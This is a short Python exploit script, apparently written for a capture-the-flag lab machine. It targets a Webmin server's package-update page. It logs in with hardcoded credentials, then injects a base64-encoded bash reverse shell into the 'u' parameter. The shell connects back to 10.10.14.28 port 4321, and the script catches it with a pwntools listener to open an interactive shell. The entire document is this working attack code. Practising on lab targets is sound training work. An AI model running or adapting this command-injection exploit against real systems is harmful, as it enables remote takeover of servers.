#!/usr/bin/python3
# coding:utf-8

from pwn import *
import requests,re,pdb, urllib3, threading

def def_handler(sig, frame):
	print("\n[!]Saindo...\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables_Global
main_url = "https://10.10.10.160:10000/session_login.cgi"
update_url = "https://10.10.10.160:10000/package-updates/update.cgi"
burp = {'http': 'http://127.0.0.1:8080'}
lport = 4321

def makeRequest():
	
	urllib3.disable_warnings()
	s = requests.session()
	s.verify = False

	data_post = {
		'user': 'Matt',
		'pass': 'computer2008'
	}

	head = {
		'Cookie': 'redirect=1; testing=1; sid=x'
	}

	r = s.post(main_url, headers=head, data=data_post)

	data_post = [
		('u', 'acl/apt'),
		('u', f' | bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80MzIxIDA+JjE= | base64 -d | bash"'),
		('ok_top', 'Update Selected Packages')
	]

	head = {
		'Referer': 'https://10.10.10.160:10000/package-updates/?xnavigation=1'
	}

	r = s.post(update_url, headers=head, data=data_post)

	# regex = re.findall(r'</b><p>\n<pre>(.*)',r.text)[0]

	# print(regex)

if __name__ == '__main__':

	try:
		threading.Thread(target=makeRequest, args=()).start()
	except Exception as e:
		log.error(str(e))

	shell = listen(lport, timeout=20).wait_for_connection()
	shell.interactive()
	
	# while True:
		# command = input(str("Command = "))
		# makeRequest(command)
